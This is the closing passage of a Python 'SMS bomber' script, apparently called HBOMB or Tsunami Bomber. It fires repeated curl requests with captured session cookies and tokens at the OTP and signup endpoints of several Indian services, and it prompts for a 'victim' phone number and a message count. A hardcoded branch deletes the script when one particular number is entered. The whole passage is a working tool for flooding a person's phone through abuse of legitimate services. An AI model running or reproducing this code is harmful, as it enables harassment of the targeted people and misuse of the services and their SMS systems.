                '''}' "https://consumer-apis.burgerking.in/api/v1/user/signUp" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#70",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.dineout.co.in" -H "content-length:65" -H "accept:application/json, text/javascript, /; q=0.01" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.dineout.co.in" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dineout.co.in/non-veg-special-restaurants-near-me" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:pwa=0" -H "cookie:WZRK_S_48K-44K-5R5Z=%7B%22p%22%3A1%2C%22s%22%3A1604561879%2C%22t%22%3A1604561879%7D" -H "cookie:WZRK_G=c0a4edbd231e4af5975c7c0013b03754" -H "cookie:gaClientId=403939189.1604561878" -H "cookie:_gat=1" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.2.1604561878472.1759911387" -H "cookie:_col_uuid=23b8f026-f1d4-42ee-9431-9ddae2926e46-62no" -H "cookie:_gid=GA1.3.529280843.1604561878" -H "cookie:_ga=GA1.3.403939189.1604561878" -H "cookie:firstUser=2" -H "cookie:connect.sid=s%3ANQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R.wov1d5tZLKCYTQMvAeauuc9FMD6qiPP4qXZPvZHjXj8" -H "cookie:city_id=0" -H "cookie:city_name=Delhi" -H "cookie:firstVisit=1" -H "cookie:countly_webapp_uid=NQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R" -d 'name=Tsunami+Bomber&email=tsunami%40gmail.com&phone='''
                + target +
                '''' "https://www.dineout.co.in/xhrajaxrequest/user_signup" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#71",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.oyorooms.com" -H "content-length:51" -H "xsrf-token:boLn36fK-mo1gdL-u8ajd3_1ihYopPCtdUXk" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:text/plain;charset=UTF-8" -H "accept:/" -H "origin:https://www.oyorooms.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.oyorooms.com/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:bm_sv=51FB5B26188E3B1A010377CA066F396A~CdOf94m28FvrgJlHsOMLxibMoTRC6EFtC5/w4xrbhmR4D0PcjfY9g2ihtdKEB4OHQqnE2Jjbp7KppArQqMLTuh+CeqTXDufQJWSEKy1TuQT4rsT/uvtN+faeGA8IknJCYpnCGnu6xc7xWjjXStxNJ5so+CPy/9VEGNXKBijJ73A=" -H "cookie:cto_bundle=dW5EdV9uQVJFR0l6ck03aGJiODZUNEJaNnlvSTZnSWZyN2Z5UTIyYnVMOERvMGhVRjBLVnR1TGE2TzRPczZEYXpsJTJGTkVQeFFHV0F5Z3B0anA3WXhGV0U0d1BObVdFOWZZZmxtJTJGYjJUSTZ6VnBzSUpneGp1cmJXQk1GclUlMkZPWHY0SUlrNFhmVWVpUU5DM0RpaCUyQmVWRG8lMkJURHRnJTNEJTNE" -H "cookie:isHomepageViewed=true" -H "cookie:XSRF-TOKEN=boLn36fK-mo1gdL-u8ajd3_1ihYopPCtdUXk" -H "cookie:expd=mww2%3A1%7CBnTc%3A0%7Cnear%3A0%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A1%7Cpwbs%3A1%7Cmwsb%3A0%7Cslin%3A1%7Chsdm%3A2%7Clpex%3A1%7Clphv%3A0%7Cdpcv%3A0%7Cgmab%3A0%7Curhe%3A0%7Cprdp%3A1%7Ccomp%3A1%7Csldw%3A1%7Cmdab%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cwboi%3A1%7Csst%3A1%7Ctxwb%3A1%7Cpod2%3A1%7Clnhd%3A1%7Cppsi%3A0%7Cgcer%3A1%7Crecs%3A1%7Cswhp%3A0%7Clvhm%3A0%7Cgmbr%3A0%7Cyolo%3A0%7Crcta%3A0" -H "cookie:moe_uuid=d9b15c19-958d-4838-a4d8-0e6313f6a899" -H "cookie:_gat=1" -H "cookie:_gid=GA1.2.699494446.1604562049" -H "cookie:_ga=GA1.2.amp-tFq7fxKPkXNa-cpIDmePQBTOwAeIzBBnke122oC9lel3Qtmxqes1NIPJmeZgfdPf" -H "cookie:AMP_TOKEN=AHTRwNPhj7EtxJyD_RuBPs0ZuKIjp3o66t2xkKdQ5e3etnndiGTnnnnQ_AubASePzWJrB0U9UG1kI8wAwUavSq4w" -H "cookie:ak_bmsc=0C93250BD2DE35694F06122DB2E120D2173A5D9DAD03000075ACA35FE266D14F~plySTVe+pT2eOrbJN47u/7i+QwcW0RcnGWTJz6IJ0GQQVUl1MO9HBlgBFSOEw7ao237yJL+waqU3yDA7Jm+KjV4ekkL8Dt2uiMmfcnOp5EIdpmDl6M0mh2hknzbcuwESX4baJYGwNMQknsOdvsW9gm8t3gyXg1dUHALioONwH94dicpzxiMVpJOeFXIeodlgSmz1W5PZMOXVsESZMqDQG1oWejFGAWxv15uNJ7XGBOHpHHfMu+AP7s++/owSlZgpvOec+17LzcnFiONwLWS53X1Q==" -H "cookie:bm_mi=572BF703EB3A8A3CCE6E5FD82C29C478~51QSzfNmDn5IBhYqDJrzVU3WLdDQOteJiUPFoVQzy6NZNTnU1F7cPWvTpHcAkbvjhkg3RolB8h/HSpaiGGjWv70EjySjqm29iAcceWKMAHFnNKIDOwquTXIkWJaGRnVARK4t/XWBuPOctTVN8zyBpYjQFaN43JKN0ZPtxlAIUJWn16nQxpCePxcya77BAObWGX0fNvVpVhhL+YFu921bU4HaJeMF2XXwditZEPfZk1/d1g9XNrcgT42oEcIxATz1SY3VB8wGazeROpsY0sd8gR3gl4IJZmOMK4sy0L+3rfM=" -H "cookie:ql=false" -H "cookie:_uid=Not%20logged%20in" -H "cookie:_csrf=m7_2j5oJ99S-vPQepeMS7NuS" -H "cookie:X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DUP%2Ccity%3DNOIDA%2Clat%3D28.57%2Clong%3D77.32%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D45609%2Cnetwork_type%3Dmobile%2Clocation_id%3D0" -H "cookie:acc=IN" -H "cookie:connect.sid=s%3AyIOWYcRpe2dpqYe6TkC2AP5LpxUGjTuO.tGRFa%2B%2BrE%2F5l51ClfuEVJ6kPoE4KoCaIUFvzRzVHZ7c" -H "cookie:_fbp=fb.1.1603884913496.917081192" -H "cookie:tvc_utm_content=(not set)" -H "cookie:tvc_utm_key=(not set)" -H "cookie:tvc_utm_campaign=(not set)" -H "cookie:tvc_utm_medium=organic" -H "cookie:tvc_utm_source=google" -H "cookie:_gcl_au=1.1.933447383.1603884913" -H "cookie:fingerprint2=d4f670396357a34731ad7e9b3ea2be0c" -H "cookie:token=SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D" -H "cookie:appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D" -H "cookie:mab=2e11992dc4c54dd59fe36360f6447c97" -d '{"phone":"'''
                + target +
                '''","country_code":"+91","nod":4}' "https://www.oyorooms.com/api/pwa/generateotp?locale=en" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#72",A)
        try:
            os.popen('''
                            curl -X GET -H "Host:www.purplle.com" -H "device_id:TEC3cjyVJhEFPGsSHw" -H "tracestate:2174843@nr=0-1-2174843-954632846-ab28153acde8ef8e----1604563013484" -H "traceparent:00-9c150aeaf03c0d35987fe67bd2403510-ab28153acde8ef8e-01" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "newrelic:eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIxNzQ4NDMiLCJhcCI6Ijk1NDYzMjg0NiIsImlkIjoiYWIyODE1M2FjZGU4ZWY4ZSIsInRyIjoiOWMxNTBhZWFmMDNjMGQzNTk4N2ZlNjdiZDI0MDM1MTAiLCJ0aSI6MTYwNDU2MzAxMzQ4NH19" -H "content-type:application/x-www-form-urlencoded" -H "accept:application/json, text/plain, /" -H "token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.purplle.com/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:sessionExpiryTime=1604564806" -H "cookie:_cfruid=20a4bcebdd179c4e63fbbeb0d6271eef3e5ec651-1604563004" -H "cookie:cf_bm=9b13a29b50f7e10544e41f92eb7dd146692e3d7e-1604563004-1800-AW3mGq8peEPN0yAegFSPA95oysBWcvWDsh8ey4YhGG03hJHlYCNKYfyIAEfNhKm5b9SwcQd6bgGY1aSlO18xR1Y=" -H "cookie:_fbp=fb.1.1604562970512.1162148084" -H "cookie:_gat_UA-28132362-1=1" -H "cookie:_gcl_marco=1.1981215102.1604562967" -H "cookie:_gid=GA1.2.990407877.1604562967" -H "cookie:_ga=GA1.2.279546588.1604562967" -H "cookie:_gcl_au=1.1.1568865454.1604562965" -H "cookie:g_state={"i_p":1604570161363,"i_l":1}" -H "cookie:cto_bundle=WnK_wl9wUEtvUHhZcDc2UFFvVXpKdGNhUW9pR1g5M01YZ3VSJTJCYk1wUkJvUXJ5eEolMkZrTEVqWDRQOVZ2TWhLSXpQcEl3cnlYS09tZHM5UUxCSDdsUThBY2x3UTdBS29iR29odnJSUnFUTUQ1ZGVQa3hxdFhmNFpLZyUyRmdTaXYlMkZObzB3bVpNTnBPWENTQ0E5JTJGRkZocnBLTHBnYWt3JTNEJTNE" -H "cookie:isSessionDetails=true" -H "cookie:session_id=e01c026cfe88113e8f8903e0a42f0a3b" -H "cookie:sessionCreatedTime=1604562951" -H "cookie:environment=prod" -H "cookie:client_ip=2401%3A4900%3A45dc%3A3edf%3A9d7d%3A63b9%3A43d%3A5e4a" -H "cookie:session_initiated=Direct" -H "cookie:_tmpsess=TEC3cjyVJhEFPGsSHw_1604562950" -H "cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs" -H "cookie:visitorppl=TEC3cjyVJhEFPGsSHw" -H "cookie:mode_device=mobile" -H "cookie:_cfduid=d9295b4e312bb8c952cfa125eeae5ea1b1604562949" "https://www.purplle.com/api/account/authorization/send_otp?phone='''
                     + target + '''&action=register" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#73",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.angelbroking.com" -H "content-length:123" -H "cache-control:max-age=0" -H "upgrade-insecure-requests:1" -H "origin:https://www.angelbroking.com" -H "content-type:application/x-www-form-urlencoded" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:navigate" -H "sec-fetch-user:?1" -H "sec-fetch-dest:document" -H "referer:https://www.angelbroking.com/open-demat-account" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:umqSiteTimer=0" -H "cookie:19229.vst=%7B%22s%22%3A%2226f30b91-0d2c-422e-b023-dd8565155821%22%2C%22t%22%3A%22returning%22%2C%22lu%22%3A1604564031935%2C%22lv%22%3A1604563645897%2C%22lp%22%3A0%7D" -H "cookie:cto_bundle=WkNuxl9vZThZc2d1RFZEVHFTYnlLUE1QYTNQMWR0YlFmVTZ3RVN4emN4OGluUkpYOTMlMkY4ZHRVTVJWOGFpQkluJTJCdW5BVnJFUnVNU2x2aEk4ckxOWW1DaDN6SmpucWJGZTl0OWFlb0VoOWlCRnVxeUlnSExpMnMyUThyVzlGekFsRkJBU1M5UkN6SkxJbFlFbzJWT3BjRGIlMkJxRlElM0QlM0Q" -H "cookie:gat_UA-1186489-17=1" -H "cookie:umqorderVal2=%229519874704%22" -H "cookie:storejs=%22storejs%22" -H "cookie:PageCookie=Lead:https://www.angelbroking.com/open-demat-account,Previous:https://www.angelbroking.com/" -H "cookie:lotl=https%3A%2F%2Fwww.angelbroking.com%2F" -H "cookie:_lo_v=1" -H "cookie:_lorid=156545-1604563454540-8a19f094f5338582" -H "cookie:_lo_uid=156545-1604563454540-7e143755be6613e0" -H "cookie:LandPageCookie=https://www.angelbroking.com/" -H "cookie:SourceMediumCookie30=direct/none" -H "cookie:CookieSourceMedium=direct/none" -H "cookie:_fbp=fb.1.1604563209374.2038457169" -H "cookie:_gid=GA1.2.113287213.1604563179" -H "cookie:_ga=GA1.2.amp-9OAU3zf-Ro1-GQscZ6fKiA" -H "cookie:_gcl_au=1.1.229780243.1604563178" -H "cookie:_cfduid=de733792a27631a027bfa486e16f221d41604563134" -d 'name=Tsunami+Bomber&mobile='''
                + target +
                '''&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752' "https://www.angelbroking.com/form-gateways/oda-form.php" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#74",A)
        try:
            os.popen('''
                            curl -X GET -H "Host:itrade.angelbroking.com" -H "Connection:keep-alive" -H "Cache-Control:max-age=0" -H "Upgrade-Insecure-Requests:1" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:navigate" -H "Sec-Fetch-User:?1" -H "Sec-Fetch-Dest:document" -H "Referer:https://www.angelbroking.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:__cfduid=de733792a27631a027bfa486e16f221d41604563134; _gcl_au=1.1.229780243.1604563178; _ga=GA1.2.amp-9OAU3zf-Ro1-GQscZ6fKiA; _gid=GA1.2.113287213.1604563179; _fbp=fb.1.1604563209374.2038457169; _lo_uid=156545-1604563454540-7e143755be6613e0; _lorid=156545-1604563454540-8a19f094f5338582; _lo_v=1; __lotl=https%3A%2F%2Fwww.angelbroking.com%2F; _gat_UA-1186489-17=1; cto_bundle=WkNuxl9vZThZc2d1RFZEVHFTYnlLUE1QYTNQMWR0YlFmVTZ3RVN4emN4OGluUkpYOTMlMkY4ZHRVTVJWOGFpQkluJTJCdW5BVnJFUnVNU2x2aEk4ckxOWW1DaDN6SmpucWJGZTl0OWFlb0VoOWlCRnVxeUlnSExpMnMyUThyVzlGekFsRkJBU1M5UkN6SkxJbFlFbzJWT3BjRGIlMkJxRlElM0QlM0Q" "https://itrade.angelbroking.com/ClientInfo/AngelBrokingParameters?id=tyn&city=UHVuZQ==&name=U3Bhcmt5IEhhY2tlcg==&mobile=OTUxOTg3NDcwNA==&cms_id=3944368&page_url=aHR0cHM6Ly93d3cuYW5nZWxicm9raW5nLmNvbS9vcGVuLWRlbWF0LWFjY291bnQ%2FdXRtX3NvdXJjZT13ZWImdXRtX21lZGl1bT1vcmdhbmlj&isotp=WQ%3D%3D"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#75",A)
        try:
            os.popen('''
                            curl -X GET -H "Host:itrade.angelbroking.com" -H "Connection:keep-alive" -H "Cache-Control:max-age=0" -H "Upgrade-Insecure-Requests:1" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:navigate" -H "Sec-Fetch-User:?1" -H "Sec-Fetch-Dest:document" -H "Referer:https://www.angelbroking.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:__cfduid=de733792a27631a027bfa486e16f221d41604563134; _gcl_au=1.1.229780243.1604563178; _ga=GA1.2.amp-9OAU3zf-Ro1-GQscZ6fKiA; _gid=GA1.2.113287213.1604563179; _fbp=fb.1.1604563209374.2038457169; _lo_uid=156545-1604563454540-7e143755be6613e0; _lorid=156545-1604563454540-8a19f094f5338582; _lo_v=1; __lotl=https%3A%2F%2Fwww.angelbroking.com%2F; _gat_UA-1186489-17=1; cto_bundle=WkNuxl9vZThZc2d1RFZEVHFTYnlLUE1QYTNQMWR0YlFmVTZ3RVN4emN4OGluUkpYOTMlMkY4ZHRVTVJWOGFpQkluJTJCdW5BVnJFUnVNU2x2aEk4ckxOWW1DaDN6SmpucWJGZTl0OWFlb0VoOWlCRnVxeUlnSExpMnMyUThyVzlGekFsRkJBU1M5UkN6SkxJbFlFbzJWT3BjRGIlMkJxRlElM0QlM0Q; ASP.NET_SessionId=ad3jfas1tjltol4sdrshyuin" "https://itrade.angelbroking.com/?utm_source=web&utm_medium=organic&page_url=https%3A%2F%2Fwww.angelbroking.com%2Fopen-demat-account%3Futm_source%3Dweb%26utm_medium%3Dorganic&cms_id=3944368"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#76",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:asvmfaizabad.org" -H "Connection:keep-alive" -H "Content-Length:83" -H "Cache-Control:max-age=0" -H "Upgrade-Insecure-Requests:1" -H "Origin:http://asvmfaizabad.org" -H "Content-Type:application/x-www-form-urlencoded" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Referer:http://asvmfaizabad.org/register.php" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:wh-widget-cookie=1" -d 'sname=Tsunami&sclass=XII&sphone='''
                + target +
                '''&spassword=tsunamiastronomia&ssection=A&submit=' "http://asvmfaizabad.org/register.php"  > /dev/null 2>&1
                            ''')
        except Exception as A:
            print("#77",A)
        
        if times > messagesss * 5:
            break
        else:
            pass

def usin():
    print("\n")
    print(yellow+"\n     Press"+blue+"1." +cl.yellow+"For Agreement")
    print(yellow+"     Press"+blue+"2." +cl.yellow+"For Start BOMBER")
    print(yellow+"     Press"+blue+"3." +cl.yellow+"For About")
    print(yellow+"     Press"+blue+"4." +cl.yellow+"For Exit")
    print("\n")
    uin=input("     ----->")
    if uin == "4":
        print(color+"     Thank You For Using"+name)
        i=0
        while i<5:
            sys.stdout.write(color+'\rExiting the Program |')
            time.sleep(0.1)
            sys.stdout.write(color+'\rExiting the Program /')
            time.sleep(0.1)
            sys.stdout.write(color+'\rExiting the Program -')
            time.sleep(0.1)
            sys.stdout.write(color+'\rExiting the Program \\')
            time.sleep(0.1)
            i=i+1
        clear()
        exit()
    elif uin == "3":
        about=open('about.txt',"r")
        string=about.read()
        for letter in string:
            time.sleep(0.01) 
            sys.stdout.write(letter)
            sys.stdout.flush()
        about.close()
        usin()
    elif uin == "2":
        pass
    elif uin == "1":
        agreement=open('agreement.txt',"r")
        string=agreement.read()
        for letter in string:
            time.sleep(0.01) 
            sys.stdout.write(letter)
            sys.stdout.flush()
        agreement.close()
        usin()
    else:
        print(color+"Invalid Option")
        print(color+"Try Again")
        usin()
usin()
print("Previously Used Number.")
print("Type s if you wanna use same number.")
numfile1=open("pun.txt", "r")
pn=numfile1.read()
print(pn)
numfile1.close()

print('''
ENTER THE PHONE NUMBER OF VICTIM WITHOUT COUNTRY CODE
(DEFAULT +91)
''')
t = input("---------->")
print("ENTER THE NUMBER OF MESSAGES YOU WANNA SEND")
m = int(input("---------->"))
target=t
messagesss=m
def nuw():
    numfile = open("pun.txt", "w")
    numfile.write(target)
    numfile.close()
if target!="s":
    nuw()

if target == '':
    print(
        color+"Check the Number..."
    )
    time.sleep(3)
    exit()
elif target == '8077453131':
    print (color+"  Welcome to my DARKSIDE !!!!!  ")
    os.system("rm HBOMB.py")
    exit()
elif messagesss <= 0:
    print(
        color+"Messages Value Incorrect"
    )
    time.sleep(3)
    exit()
elif len(target) == 10 and messagesss>0:
    uotp=input("ENTER OTP: ")
    if uotp == cotp:
        pass
    else:
        print("OTP IS INCORRECT!!!")
        time.sleep(2)
        exit()
    smsbom(target, color, messagesss)
    print(color+"Wait for 30 Seconds")
    time.sleep(30)
    print(color+"Sent Successfully")
    time.sleep(3)
    exit()
elif target=="s":
    target=pn
    uotp=input("ENTER OTP: ")
    if uotp == cotp:
        pass
    else:
        print("OTP IS INCORRECT!!!")
        time.sleep(2)
        exit()
    smsbom(target, color, messagesss)
    print(color+"Wait for 30 Seconds")
    time.sleep(30)
    print(color+"Sent Successfully")
    time.sleep(3)
    exit()
else:
    print(
        color+"Unexpected Error"
    )
    exit()
# Oh, I'm Glad that You are Reading My Code.
# Well, Good Luck
